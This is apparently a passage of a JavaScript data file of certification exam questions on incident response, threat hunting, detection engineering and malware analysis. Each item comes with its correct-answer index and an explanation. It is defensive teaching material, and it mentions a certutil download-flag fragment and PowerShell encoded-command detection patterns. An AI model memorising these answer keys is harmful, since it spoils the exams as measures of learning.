      { id: "ir-q7-29", question: "What is the purpose of creating an incident timeline?", options: ["Fill out paperwork", "Reconstruct the sequence of events to understand attack progression and identify gaps in detection", "Satisfy auditors", "Track analyst hours"], correctAnswer: 1, explanation: "Timelines reveal attack progression, dwell time, detection delays, and response effectiveness — essential for root cause analysis and improvement." },
      { id: "ir-q7-30", question: "An incident involves a compromised service account with access to 50+ systems. What containment strategy is appropriate?", options: ["Disable all 50 systems", "Rotate the service account credentials, audit all systems it accessed, and implement enhanced monitoring", "Ignore it — service accounts aren't important", "Only reset the password"], correctAnswer: 1, explanation: "Rotate credentials immediately, audit all accessed systems for signs of compromise, and add monitoring — don't just reset password (attacker may have installed backdoors)." }
    ]
  },
  // THREAT HUNTING FUNDAMENTALS — FINAL CERTIFICATION EXAM
  {
    quizId: "th-q7",
    courseId: "threat-hunting",
    title: "Threat Hunting Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Threat Hunting Fundamentals certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "th-q7-1", question: "What fundamentally distinguishes threat hunting from traditional detection?", options: ["Hunting uses more tools", "Hunting is proactive and hypothesis-driven; detection is reactive and alert-driven", "There's no difference", "Hunting only uses automated tools"], correctAnswer: 1, explanation: "Hunting proactively searches for threats without alerts, using hypotheses. Detection relies on pre-built rules to generate alerts reactively." },
      { id: "th-q7-2", question: "In the Hunting Maturity Model (HMM), what characterizes Level 3 (Innovative)?", options: ["No hunting capability", "Hunters create custom data analysis techniques and automate hunt procedures", "Only using threat intel feeds", "Following vendor playbooks only"], correctAnswer: 1, explanation: "HMM Level 3 organizations develop original analytical methods, automate repetitive hunts, and contribute to community knowledge." },
      { id: "th-q7-3", question: "What is the Pyramid of Pain and why is it important for hunting?", options: ["A training tool", "Ranks indicator types by adversary cost to change — hunting TTPs forces highest adversary cost", "A vulnerability scoring system", "A compliance framework"], correctAnswer: 1, explanation: "The Pyramid of Pain shows that hunting for TTPs (top) is far more impactful than IOC matching (bottom) — attackers easily change hashes/IPs but struggle to change tactics." },
      { id: "th-q7-4", question: "You hypothesize APT actors are using scheduled tasks for persistence. What data do you hunt?", options: ["Firewall logs", "Windows Event ID 4698 (scheduled task created) and schtasks.exe process creation logs", "DNS queries", "Email logs"], correctAnswer: 1, explanation: "Event ID 4698 logs scheduled task creation details. Also hunt for schtasks.exe in process creation logs with suspicious command-line arguments." },
      { id: "th-q7-5", question: "What is a LOLBin and why are they challenging to detect?", options: ["A type of malware", "Legitimate OS binaries abused for malicious purposes — they blend with normal system activity", "A vulnerability", "A network protocol"], correctAnswer: 1, explanation: "Living-off-the-Land Binaries (LOLBins) like powershell, certutil, mshta are legitimate tools abused by attackers — hard to detect because they're expected on systems." },
      { id: "th-q7-6", question: "How do you build a hunt hypothesis from MITRE ATT&CK?", options: ["Random selection", "Select a technique relevant to your threat model, identify expected data sources, and define what anomalous usage looks like", "Use every technique", "Only use the most popular techniques"], correctAnswer: 1, explanation: "Map your threat model to ATT&CK techniques, identify relevant data sources (process, network, file), and define baseline vs anomalous behavior." },
      { id: "th-q7-7", question: "What is the 'noise reduction' technique in threat hunting?", options: ["Turning off alerts", "Filtering out known-good activity to surface anomalies — whitelist legitimate baselines", "Reducing log volume", "Ignoring false positives"], correctAnswer: 1, explanation: "Stack known-good patterns (legitimate processes, normal users, expected schedules) and filter them out to surface anomalous behavior for investigation." },
      { id: "th-q7-8", question: "You discover that certutil.exe downloaded a file from an external URL. Is this malicious?", options: ["Always malicious", "Suspicious — certutil is a LOLBin commonly abused for file downloads; investigate context (user, URL, downloaded file)", "Always legitimate", "Only if from the internet"], correctAnswer: 1, explanation: "certutil -urlcache -f is a known LOLBin technique (T1105). Investigate who ran it, what URL, what was downloaded, and the broader context." },
      { id: "th-q7-9", question: "What statistical technique helps identify C2 beaconing in network data?", options: ["Simple counting", "Analyzing inter-connection time intervals for low jitter (regularity) across multiple sessions", "Checking packet size only", "Looking at port numbers"], correctAnswer: 1, explanation: "C2 beacons have regular timing intervals. Calculate the standard deviation of connection intervals — low jitter indicates automated beaconing." },
      { id: "th-q7-10", question: "How does threat intelligence enhance hunt hypotheses?", options: ["It replaces hypotheses", "Provides adversary TTPs, known IOCs, and campaign context to focus hunts on relevant threats", "Only adds IOCs to blocklists", "It's not useful for hunting"], correctAnswer: 1, explanation: "TI provides context on active threat actors targeting your sector, their preferred TTPs, and specific IOCs to prioritize and focus hunt activities." },
      { id: "th-q7-11", question: "What is 'stacking' in hunt analysis?", options: ["Combining tools", "Aggregating values and sorting by frequency to identify rare outliers (least common analysis)", "Building a tech stack", "Layering filters"], correctAnswer: 1, explanation: "Stacking groups values (process names, parent-child relationships, DNS queries) by frequency — rare items (bottom of the stack) deserve investigation." },
      { id: "th-q7-12", question: "You're hunting for credential dumping. Which data sources are MOST relevant?", options: ["Web proxy logs", "Process access to lsass.exe (Sysmon Event 10), NTDS.dit access, and suspicious registry queries", "Physical access logs", "Email logs"], correctAnswer: 1, explanation: "Credential dumping targets lsass.exe memory (Mimikatz), NTDS.dit (domain), and SAM registry hives. Sysmon Event 10 logs process access to these." },
      { id: "th-q7-13", question: "What makes a good hunt hypothesis?", options: ["Be as broad as possible", "Testable, specific, tied to a technique/threat actor, and based on available data sources", "Based on gut feeling", "Focus only on known IOCs"], correctAnswer: 1, explanation: "Good hypotheses are specific (one technique), testable (data sources exist), threat-informed (relevant to your environment), and falsifiable." },
      { id: "th-q7-14", question: "How do you hunt for DLL sideloading?", options: ["Scan for malware signatures", "Look for legitimate executables loading DLLs from unexpected paths or unsigned DLLs in trusted directories", "Monitor network traffic", "Check user permissions"], correctAnswer: 1, explanation: "DLL sideloading abuses DLL search order — hunt for signed EXEs loading unsigned DLLs, or DLLs loading from non-standard directories." },
      { id: "th-q7-15", question: "What is the difference between IOC-based and TTP-based hunting?", options: ["They're identical", "IOC-based matches specific artifacts (hashes, IPs); TTP-based hunts behavioral patterns regardless of specific indicators", "TTP-based is easier", "IOC-based is more effective"], correctAnswer: 1, explanation: "IOC hunting is narrow and easily evaded (change hash = evade). TTP hunting finds behavioral patterns that persist across campaigns regardless of specific IOCs." },
      { id: "th-q7-16", question: "You find PowerShell executing encoded commands (-enc) at 3 AM from a service account. What is your assessment?", options: ["Normal automation", "Highly suspicious — investigate the encoded command content, service account usage patterns, and triggering mechanism", "Ignore it", "Block PowerShell entirely"], correctAnswer: 1, explanation: "Encoded PowerShell from a service account at unusual hours is a strong indicator. Decode the command, investigate the account, and check for lateral movement." },
      { id: "th-q7-17", question: "What is the purpose of documenting hunt findings even when no threats are found?", options: ["Waste of time if nothing found", "Proves coverage, identifies data gaps, refines future hypotheses, and demonstrates security posture", "Only document positive findings", "Required by regulations only"], correctAnswer: 1, explanation: "Negative results are valuable — they prove you checked, identify logging gaps, improve baselines, and help prioritize future hunts." },
      { id: "th-q7-18", question: "How do you detect process injection techniques during a hunt?", options: ["Check file sizes", "Monitor for processes accessing other processes' memory space (Sysmon Event 8/10, CreateRemoteThread)", "Look at network logs", "Check user logins"], correctAnswer: 1, explanation: "Process injection involves writing to and executing in another process — Sysmon Event 8 (CreateRemoteThread) and Event 10 (ProcessAccess) capture these." },
      { id: "th-q7-19", question: "What is the value of hunting in cloud environments (AWS/Azure/GCP)?", options: ["Cloud is secure by default", "Cloud APIs create rich audit trails (CloudTrail, Activity Logs) that can reveal unauthorized access and misconfigurations", "Not possible to hunt in cloud", "Same as on-premise"], correctAnswer: 1, explanation: "Cloud environments generate detailed API logs, enabling hunts for unusual API calls, privilege escalation, unauthorized access patterns, and misconfigurations." },
      { id: "th-q7-20", question: "What converts a successful hunt finding into an ongoing detection?", options: ["Nothing — hunts are one-time", "Translating the hunt query into a SIEM correlation rule or SIGMA detection with tuning and testing", "Emailing the team", "Adding to a report"], correctAnswer: 1, explanation: "Successful hunts should be operationalized — convert the search logic into SIGMA/SIEM rules, test against historical data, tune for false positives, and deploy." },
      { id: "th-q7-21", question: "You're hunting in network metadata and find a host making HTTPS connections to an IP with a self-signed certificate every 30 minutes. Assessment?", options: ["Normal HTTPS", "Likely C2 beaconing — self-signed cert + regular interval + IP-based (no domain) are strong indicators", "Certificate misconfiguration", "CDN behavior"], correctAnswer: 1, explanation: "Regular interval + self-signed cert + direct IP (no SNI/domain) is classic C2. Investigate the host, check process making connections, and analyze timing patterns." },
      { id: "th-q7-22", question: "What is 'threat-informed defense' and how does it relate to hunting?", options: ["Using any threat data", "Prioritizing defenses based on real adversary behavior relevant to your organization — hunts validate these defenses", "A vendor product", "Compliance requirement"], correctAnswer: 1, explanation: "Threat-informed defense uses real adversary intelligence to prioritize security. Hunts validate that defenses actually detect the prioritized TTPs." },
      { id: "th-q7-23", question: "How do you hunt for data exfiltration via cloud storage services?", options: ["Block all cloud", "Monitor for unusual uploads to cloud storage APIs, large data transfers to cloud IPs, and cloud sync tool abuse", "Check email only", "Impossible to detect"], correctAnswer: 1, explanation: "Hunt for unusual cloud storage API usage, large file uploads, cloud sync tools running from unexpected users/machines, and outbound data volume anomalies." },
      { id: "th-q7-24", question: "What is the role of automation in mature threat hunting programs?", options: ["Replace human hunters", "Automate data collection, baseline enrichment, and routine hunts — freeing humans for creative hypothesis development", "Automation isn't useful", "Only for alerts"], correctAnswer: 1, explanation: "Automation handles repetitive tasks (data gathering, enrichment, scheduled hunts) while humans focus on creative hypothesis development and complex analysis." },
      { id: "th-q7-25", question: "You discover WMI event subscriptions created on 5 servers at the same time. What does this indicate?", options: ["Normal administration", "Likely persistence mechanism deployed across multiple systems — investigate for compromise", "WMI error", "Monitoring tool deployment"], correctAnswer: 1, explanation: "Simultaneous WMI event subscription creation across multiple servers suggests automated persistence deployment — a strong indicator of coordinated compromise." },
      { id: "th-q7-26", question: "What metrics should a hunt team track?", options: ["Only threats found", "Hunts completed, findings (true/false positives), detections created, data gaps identified, and coverage mapped", "Hours worked", "Tools purchased"], correctAnswer: 1, explanation: "Track hunt volume, finding rates, detection conversions, gaps discovered, ATT&CK coverage improvements — these demonstrate program value and guide priorities." },
      { id: "th-q7-27", question: "How does YARA complement threat hunting?", options: ["Replaces hunting", "Enables pattern-based scanning of files and memory for malware characteristics during endpoint hunts", "Only for email scanning", "Network monitoring tool"], correctAnswer: 1, explanation: "YARA rules define pattern-based signatures (strings, hex, conditions) to scan files, memory, and processes during endpoint hunts for known malware families." },
      { id: "th-q7-28", question: "What challenge does 'living off the cloud' present compared to traditional LOLBins?", options: ["No challenge", "Attackers abuse legitimate cloud services (OneDrive, GitHub, Slack) for C2 — traffic blends with legitimate business usage", "Easier to detect", "Only affects cloud environments"], correctAnswer: 1, explanation: "Living off the cloud uses legitimate SaaS platforms for C2/exfiltration — traffic to these domains is expected, making detection extremely challenging." },
      { id: "th-q7-29", question: "When should hunt results be shared with the broader security team?", options: ["Never", "Immediately for active threats; regularly for findings, new baselines, and detection recommendations", "Only in annual reports", "When asked"], correctAnswer: 1, explanation: "Share active threats immediately for response. Regular sharing of findings, baselines, and detection recommendations improves the entire security program." },
      { id: "th-q7-30", question: "What is the ideal relationship between threat hunting and detection engineering?", options: ["They're separate functions", "A continuous loop — hunts discover threats that become detections; detection gaps inspire new hunts", "Hunting replaces detection", "Detection replaces hunting"], correctAnswer: 1, explanation: "Hunting and detection engineering form a virtuous cycle — hunt findings become new detections, and detection blind spots generate new hunt hypotheses." }
    ]
  },
  // DETECTION ENGINEERING BASICS — FINAL CERTIFICATION EXAM
  {
    quizId: "de-q7",
    courseId: "detection-engineering",
    title: "Detection Engineering Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Detection Engineering Basics certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "de-q7-1", question: "What is the primary goal of detection engineering?", options: ["Block all threats", "Create high-fidelity, maintainable detection rules that reliably identify malicious activity with minimal false positives", "Replace SOC analysts", "Automate all security"], correctAnswer: 1, explanation: "Detection engineering creates quality rules that analysts trust — balancing detection coverage with actionable, low-noise alerts." },
      { id: "de-q7-2", question: "What is a SIGMA rule?", options: ["A firewall rule", "A vendor-agnostic detection rule format that can be converted to multiple SIEM query languages", "An encryption algorithm", "A network protocol"], correctAnswer: 1, explanation: "SIGMA rules are written in YAML and define detections that can be automatically converted to Splunk SPL, Elastic KQL, Microsoft KQL, and more." },
      { id: "de-q7-3", question: "In a SIGMA rule, what does the 'logsource' section define?", options: ["The SIEM vendor", "The category, product, and service that generates the events the rule detects", "The output format", "The alert severity"], correctAnswer: 1, explanation: "logsource specifies where events come from (e.g., category: process_creation, product: windows) enabling correct backend conversion." },
      { id: "de-q7-4", question: "What SIGMA detection modifier matches any item in a list?", options: ["all", "contains", "The default OR logic when listing multiple values", "regex"], correctAnswer: 2, explanation: "By default, multiple values under a field use OR logic — any match triggers. Use 'all' modifier to require every value matches." },
      { id: "de-q7-5", question: "What is YARA primarily used for?", options: ["Network monitoring", "Pattern-based file and memory scanning to identify and classify malware families", "Log analysis", "User authentication"], correctAnswer: 1, explanation: "YARA defines rules with string patterns, hex sequences, and conditions to identify malware families in files, memory dumps, and process memory." },
      { id: "de-q7-6", question: "In a YARA rule, what does the 'condition' section do?", options: ["Lists file names", "Defines the boolean logic that determines when a rule matches based on defined strings and metadata", "Sets alert severity", "Specifies the target OS"], correctAnswer: 1, explanation: "The condition section combines string identifiers, counts, file size checks, and boolean logic to determine if a file matches the rule." },
      { id: "de-q7-7", question: "What is the difference between Sysmon Event ID 1 and Windows Event ID 4688?", options: ["They're identical", "Sysmon 1 provides richer data (hashes, parent command line, current directory); 4688 is native but less detailed", "4688 has more data", "Sysmon 1 is for network events"], correctAnswer: 1, explanation: "Sysmon Event 1 captures file hash, parent process command line, current directory, and more. 4688 is native but requires audit policy and provides less detail." },
      { id: "de-q7-8", question: "What log source would detect credential dumping from LSASS?", options: ["Firewall logs", "Sysmon Event 10 (ProcessAccess) targeting lsass.exe with suspicious access masks", "DNS logs", "Web proxy logs"], correctAnswer: 1, explanation: "Sysmon Event 10 logs when a process accesses another's memory — detecting tools like Mimikatz accessing lsass.exe for credential extraction." },
      { id: "de-q7-9", question: "What is 'Detection as Code'?", options: ["Writing detections in Python", "Managing detection rules with software engineering practices: version control, testing, CI/CD, and peer review", "Using AI for detection", "Coding a SIEM from scratch"], correctAnswer: 1, explanation: "Detection as Code applies DevOps practices to detection management — Git versioning, automated testing, CI/CD deployment, and code review for quality." },
      { id: "de-q7-10", question: "Why is unit testing important for detection rules?", options: ["It's not important", "Validates rules detect true positives and don't trigger on benign activity before production deployment", "Only for compliance", "Slows development"], correctAnswer: 1, explanation: "Unit tests verify detection logic against known-good and known-bad samples — catching false positives/negatives before rules impact production SOC." },
      { id: "de-q7-11", question: "What is the purpose of a detection coverage matrix mapped to MITRE ATT&CK?", options: ["Compliance documentation", "Visualize which techniques have detections and identify coverage gaps to prioritize development", "Track analyst performance", "List all SIEM rules"], correctAnswer: 1, explanation: "Coverage matrices show detection presence/absence per ATT&CK technique, revealing gaps that detection engineers should prioritize filling." },
      { id: "de-q7-12", question: "How do you measure detection rule quality?", options: ["Count of rules only", "True positive rate, false positive rate, mean time to detect, and analyst feedback on actionability", "Rule complexity", "Number of log sources"], correctAnswer: 1, explanation: "Quality metrics include TP/FP rates, detection latency, analyst satisfaction, and actionability — a high-TP, low-FP rule that analysts trust is high quality." },
      { id: "de-q7-13", question: "What is 'detection drift' and how do you prevent it?", options: ["Detections improving over time", "Rules becoming ineffective as environments change — prevent with regular validation, testing, and coverage reviews", "Moving detections between SIEMs", "Normal behavior"], correctAnswer: 1, explanation: "Detection drift occurs when environment changes (new tools, infrastructure) invalidate existing rules. Regular validation and automated testing prevent drift." },
      { id: "de-q7-14", question: "What is the 'base rate fallacy' in detection engineering?", options: ["A math error", "When a rare event detector generates more false positives than true positives due to the low prevalence of real attacks", "A detection methodology", "A SIGMA feature"], correctAnswer: 1, explanation: "Even a 99% accurate detector for a 1-in-million event will generate far more false positives than true positives — understanding this guides rule tuning." },
      { id: "de-q7-15", question: "How should you handle a detection rule with a 90% false positive rate?", options: ["Delete it immediately", "Analyze FP patterns, add exclusions for known-good behavior, narrow scope, or restructure the detection logic", "Ignore the FPs", "Lower the severity"], correctAnswer: 1, explanation: "Analyze FP patterns to identify what's triggering falsely, add targeted exclusions, narrow the rule scope, or redesign the detection approach entirely." },
      { id: "de-q7-16", question: "What is a SIGMA 'pipeline' in the context of rule conversion?", options: ["A data pipeline", "A transformation configuration that maps SIGMA field names and log sources to a specific SIEM's schema", "A CI/CD pipeline", "A network pipeline"], correctAnswer: 1, explanation: "SIGMA pipelines define field name mappings and log source translations for specific SIEM backends — ensuring rules convert correctly to target query languages." },
      { id: "de-q7-17", question: "When writing a detection for PowerShell abuse, what makes '-enc' or '-encodedcommand' detection insufficient?", options: ["It's a perfect detection", "Attackers can use partial parameter names (-e, -en, -enco) due to PowerShell's parameter abbreviation feature", "It catches too many things", "PowerShell doesn't support encoding"], correctAnswer: 1, explanation: "PowerShell accepts abbreviated parameters — detect all variations: -e, -en, -enc, -enco, -encod, etc., or use regex for robust matching." },
      { id: "de-q7-18", question: "What is the difference between a 'detection' and an 'analytic'?", options: ["They're identical", "A detection generates alerts; an analytic provides data insights that may inform detections or hunts", "Analytics replace detections", "Detections are automated, analytics are manual"], correctAnswer: 1, explanation: "Detections are alert-generating rules. Analytics are broader queries that surface patterns, trends, or anomalies — analytics may feed into detection development." },
      { id: "de-q7-19", question: "How do you detect 'parent-child process anomalies'?", options: ["Check file names", "Define expected parent-child relationships and alert on deviations (e.g., Excel spawning PowerShell)", "Monitor memory usage", "Check network connections"], correctAnswer: 1, explanation: "Baseline normal parent-child trees (explorer→chrome, services→svchost) and detect anomalies like winword.exe→powershell.exe or outlook.exe→cmd.exe." },
      { id: "de-q7-20", question: "What role does threat intelligence play in detection engineering prioritization?", options: ["No role", "TI identifies which ATT&CK techniques are actively used against your sector, focusing development on real threats", "Only provides IOCs", "Replaces detection engineering"], correctAnswer: 1, explanation: "TI informs which threat actors target your sector and their preferred techniques — enabling prioritized detection development for the most relevant threats." },
      { id: "de-q7-21", question: "What is a 'canary token' and how does it relate to detection?", options: ["A monitoring agent", "A tripwire — fake credentials, files, or DNS entries that generate alerts when accessed by attackers", "A SIEM feature", "A type of SIGMA rule"], correctAnswer: 1, explanation: "Canary tokens are decoy resources (fake admin creds, honeypot files, DNS canaries) that generate high-confidence alerts when touched — zero false positive detection." },
      { id: "de-q7-22", question: "What YARA feature enables hunting for packed or encrypted malware?", options: ["String matching", "Math module for entropy calculation and file size conditions to identify suspicious sections", "Rule inheritance", "Hex patterns only"], correctAnswer: 1, explanation: "The math module's entropy function identifies high-entropy sections (packed/encrypted data), combined with file size conditions to find suspicious binaries." },
      { id: "de-q7-23", question: "How should detection rules be versioned?", options: ["No versioning needed", "Git with semantic versioning, changelogs documenting modifications, and tagged releases for production deployments", "Manual spreadsheet tracking", "Email notifications"], correctAnswer: 1, explanation: "Git versioning with semantic versioning (major.minor.patch), detailed changelogs, and tagged releases enables rollback, audit trail, and collaboration." },
      { id: "de-q7-24", question: "What is the 'alert funnel' concept in detection engineering?", options: ["A visualization tool", "Progressively filtering events through correlation, enrichment, and scoring to surface only high-confidence alerts", "A SIEM feature", "A marketing term"], correctAnswer: 1, explanation: "The alert funnel reduces noise through layers: raw events → correlated alerts → enriched alerts → scored/prioritized alerts for analyst review." },
      { id: "de-q7-25", question: "How do you write a SIGMA rule to detect Mimikatz execution?", options: ["Match the filename 'mimikatz.exe'", "Detect behavioral indicators: process accessing lsass.exe, specific command-line arguments, or known PE metadata", "Block the hash", "Monitor port 445"], correctAnswer: 1, explanation: "Filename matching is trivially evaded. Detect behavior: lsass access patterns, known command-line arguments (sekurlsa, kerberos), or PE metadata indicators." },
      { id: "de-q7-26", question: "What is the purpose of detection rule deprecation?", options: ["Delete old rules", "Formally retire rules that are no longer relevant, documented with rationale, to prevent rule bloat", "Upgrade rules automatically", "Archive for compliance"], correctAnswer: 1, explanation: "Deprecation formally marks rules as retired with documented reasoning — preventing rule bloat while maintaining historical record for auditing." },
      { id: "de-q7-27", question: "How do you handle detection for techniques with many legitimate uses (e.g., PowerShell)?", options: ["Don't detect them", "Layer multiple behavioral indicators, use allowlists for known-good usage, and correlate with additional context", "Block the tool entirely", "Only detect known signatures"], correctAnswer: 1, explanation: "For dual-use tools: combine behavioral signals (unusual parent, encoded commands, network activity) with context (user, time, machine) and known-good exclusions." },
      { id: "de-q7-28", question: "What is the value of community-shared detection rules (e.g., SIGMA rules repository)?", options: ["No value — use only custom rules", "Leverage collective expertise, accelerate coverage, and adapt proven rules to your environment", "Use them without modification", "Only for small teams"], correctAnswer: 1, explanation: "Community rules provide broad coverage quickly. Adapt them to your environment's log sources, field names, and false positive patterns for maximum value." },
      { id: "de-q7-29", question: "What should a detection engineering program's maturity assessment include?", options: ["Only rule count", "Coverage breadth, rule quality metrics, CI/CD maturity, testing practices, and ATT&CK mapping completeness", "Tool inventory", "Team size"], correctAnswer: 1, explanation: "Maturity spans coverage (ATT&CK mapping), quality (TP/FP rates), engineering practices (CI/CD, testing), documentation, and continuous improvement processes." },
      { id: "de-q7-30", question: "You need to detect a new zero-day technique with no known signatures. What approach do you take?", options: ["Wait for vendor signatures", "Develop behavioral detection based on the technique's observable actions rather than specific IOCs", "Block everything", "Ignore until patches exist"], correctAnswer: 1, explanation: "Zero-days lack signatures. Detect the behavior — what the exploit does (process creation, file drops, network callbacks) rather than what the exploit looks like." }
    ]
  },
  // MALWARE ANALYSIS FUNDAMENTALS — FINAL CERTIFICATION EXAM
  {
    quizId: "ma-q7",
    courseId: "malware-analysis",
    title: "Malware Analysis Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Malware Analysis Fundamentals certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "ma-q7-1", question: "What is the difference between a virus and a worm?", options: ["They're identical", "A virus requires a host file to propagate; a worm self-propagates independently across networks", "Worms are less dangerous", "Viruses only affect documents"], correctAnswer: 1, explanation: "Viruses attach to and modify host files to spread. Worms are standalone programs that self-replicate across networks without needing a host file." },
      { id: "ma-q7-2", question: "Why is FlareVM preferred over a standard Windows VM for malware analysis?", options: ["It's free", "Pre-configured with analysis tools (debuggers, disassemblers, PE tools) and security settings optimized for safe analysis", "Better performance", "Official Microsoft product"], correctAnswer: 1, explanation: "FlareVM comes pre-installed with tools like x64dbg, Ghidra, PEStudio, YARA, and is configured with analysis-friendly settings and disabled security features." },
      { id: "ma-q7-3", question: "What is the FIRST step when you receive a malware sample for analysis?", options: ["Execute it immediately", "Hash the sample (MD5, SHA-256) and check against threat intel databases like VirusTotal", "Disassemble it", "Delete it"], correctAnswer: 1, explanation: "Always hash first — if the sample is known, existing analysis saves time. Check VirusTotal, MalwareBazaar, and internal threat intel before spending analysis effort." },
      { id: "ma-q7-4", question: "What does the 'strings' command reveal during static analysis?", options: ["File metadata only", "Human-readable text embedded in the binary: URLs, IPs, registry keys, error messages, and API names", "File structure", "Encryption keys"], correctAnswer: 1, explanation: "Strings extraction reveals embedded text indicators: C2 URLs, file paths, registry keys, API names, error strings, and sometimes hardcoded credentials." },
      { id: "ma-q7-5", question: "What is a PE file's Import Address Table (IAT) and why is it important for analysis?", options: ["A memory allocation table", "Lists external DLL functions the binary calls — reveals capabilities like file I/O, networking, and crypto usage", "A compression table", "A debugging feature"], correctAnswer: 1, explanation: "The IAT shows which API functions the binary imports — CreateFile, InternetOpenUrl, CryptEncrypt reveal file access, network, and encryption capabilities." },
      { id: "ma-q7-6", question: "What is 'packing' in the context of malware?", options: ["File compression for email", "Compressing and/or encrypting the binary to hide its true code and evade static analysis", "Bundling multiple files", "Adding metadata"], correctAnswer: 1, explanation: "Packers compress/encrypt the executable code. At runtime, a stub unpacks the original code into memory — this defeats static string and import analysis." },
      { id: "ma-q7-7", question: "How do you identify if a PE file is packed?", options: ["Check the filename", "High entropy in sections, few imports, small IAT, UPX/custom packer signatures, and section name anomalies", "Check file size only", "Run it and observe"], correctAnswer: 1, explanation: "Packed indicators: high section entropy (>7.0), very few imports (just LoadLibrary/GetProcAddress), unusual section names (.upx, .packed), and small code sections." },
      { id: "ma-q7-8", question: "During dynamic analysis, what does ProcMon capture?", options: ["Network traffic", "Real-time file system, registry, process, and thread activity with full stack traces", "Memory dumps", "DNS queries only"], correctAnswer: 1, explanation: "Process Monitor captures granular system activity: file creates/reads/writes, registry modifications, process/thread creation, and network connections with stack traces." },
      { id: "ma-q7-9", question: "What is API hooking in dynamic analysis?", options: ["Calling APIs directly", "Intercepting API calls to monitor what functions malware invokes and with what parameters", "A programming technique", "Disabling APIs"], correctAnswer: 1, explanation: "API hooking intercepts function calls (CreateFile, WriteProcessMemory, InternetConnect) to log parameters and behavior without modifying the malware." },
      { id: "ma-q7-10", question: "A malware sample checks for 'vmtoolsd.exe' and 'VBoxService.exe' processes. What is it doing?", options: ["Checking for updates", "VM detection — anti-analysis technique to detect virtual machine environments and alter behavior", "Looking for dependencies", "Process injection"], correctAnswer: 1, explanation: "Checking for VM-specific processes is a common anti-analysis technique. If detected, malware may exit, sleep, or behave benignly to evade sandbox analysis." },
      { id: "ma-q7-11", question: "What is the purpose of a sandbox in malware analysis?", options: ["Store malware samples", "Automated dynamic execution environment that monitors behavior and generates analysis reports", "A coding environment", "Network isolation only"], correctAnswer: 1, explanation: "Sandboxes (Cuckoo, ANY.RUN, Joe Sandbox) automatically execute malware in isolated environments, monitoring all activity and generating behavioral reports." },
      { id: "ma-q7-12", question: "How do VBA macros typically deliver malware payloads?", options: ["Direct execution", "Auto_Open/Document_Open macros use PowerShell, WScript, or certutil to download and execute payloads from remote servers", "Through email headers", "Via DNS"], correctAnswer: 1, explanation: "Malicious macros trigger on document open, then use shell commands (PowerShell, WScript) to download second-stage payloads from attacker-controlled servers." },
      { id: "ma-q7-13", question: "What is 'code injection' and name two common techniques?", options: ["Writing code in an IDE", "Inserting code into another process's memory space — DLL injection and process hollowing are common methods", "SQL injection", "HTML injection"], correctAnswer: 1, explanation: "Code injection inserts malicious code into legitimate processes. DLL injection loads a malicious DLL; process hollowing replaces a suspended process's code." },
      { id: "ma-q7-14", question: "In x86 assembly, what does 'CALL' instruction do?", options: ["Exits the program", "Pushes the return address onto the stack and transfers execution to the target function", "Allocates memory", "Compares values"], correctAnswer: 1, explanation: "CALL pushes EIP (next instruction address) onto the stack as return address, then jumps to the target function. RET pops the address to return." },
      { id: "ma-q7-15", question: "What is Ghidra's decompiler useful for?", options: ["Compiling code", "Converting assembly instructions back to approximate C/C++ source code for easier analysis", "Network analysis", "Debugging"], correctAnswer: 1, explanation: "Ghidra's decompiler translates disassembly into pseudo-C code, making it much easier to understand program logic without reading raw assembly." },
      { id: "ma-q7-16", question: "What is the purpose of setting breakpoints in a debugger during malware analysis?", options: ["Stop the malware permanently", "Pause execution at specific addresses to inspect memory, registers, and variable values at that point", "Add code to the binary", "Monitor network traffic"], correctAnswer: 1, explanation: "Breakpoints pause execution so you can examine the current state — register values, memory contents, stack — crucial for understanding malware behavior." },
      { id: "ma-q7-17", question: "How does ransomware typically encrypt files?", options: ["Simple XOR only", "Hybrid encryption: symmetric key (AES) encrypts files, asymmetric key (RSA) encrypts the symmetric key", "ROT13 cipher", "Base64 encoding"], correctAnswer: 1, explanation: "Ransomware uses hybrid encryption for speed: AES encrypts each file quickly, then RSA encrypts the AES key — only the attacker's RSA private key can decrypt." },
      { id: "ma-q7-18", question: "What is a YARA rule's 'meta' section used for?", options: ["Define matching logic", "Store descriptive information: author, date, description, threat level, and reference URLs", "List file paths", "Configure scanning options"], correctAnswer: 1, explanation: "The meta section stores rule metadata for documentation — author, creation date, malware family, description, references, and severity classification." },
      { id: "ma-q7-19", question: "What is 'process hollowing'?", options: ["Deleting a process", "Creating a suspended legitimate process, unmapping its code, and injecting malicious code in its place", "Memory leak", "Process termination"], correctAnswer: 1, explanation: "Process hollowing creates a suspended legitimate process (e.g., svchost.exe), hollows out its code section, writes malicious code, and resumes — masquerading as legitimate." },
      { id: "ma-q7-20", question: "How do you safely extract IOCs from a malware sample?", options: ["Run it on production", "Use static analysis tools in an isolated environment to extract strings, hashes, embedded URLs, and C2 infrastructure", "Ask the attacker", "Use VirusTotal only"], correctAnswer: 1, explanation: "In an isolated analysis VM: extract strings, decode encoded data, parse PE resources, and collect hashes, IPs, domains, URLs, mutexes, and registry keys." },
      { id: "ma-q7-21", question: "What is the significance of the PE file's timestamp?", options: ["When it was downloaded", "Compilation timestamp — can indicate when the malware was built, though it's easily forged", "File creation time", "When it was first seen"], correctAnswer: 1, explanation: "The PE timestamp shows compilation time, helping estimate creation date and correlate with campaigns. However, sophisticated actors routinely forge this value." },
      { id: "ma-q7-22", question: "What technique do malware authors use to make reverse engineering harder?", options: ["Good documentation", "Code obfuscation: dead code insertion, control flow flattening, string encryption, and anti-debugging tricks", "Open-source release", "Adding comments"], correctAnswer: 1, explanation: "Obfuscation techniques include junk code insertion, opaque predicates, string encryption, API hashing, and anti-debug checks to slow reverse engineering." },
      { id: "ma-q7-23", question: "What is a mutex in malware behavior and why do analysts care about it?", options: ["A file type", "A named synchronization object — malware creates unique mutexes to prevent multiple instances, serving as IOCs", "A network protocol", "An encryption algorithm"], correctAnswer: 1, explanation: "Malware creates named mutexes to ensure single execution. These unique names serve as reliable IOCs for detection and can identify malware families." },
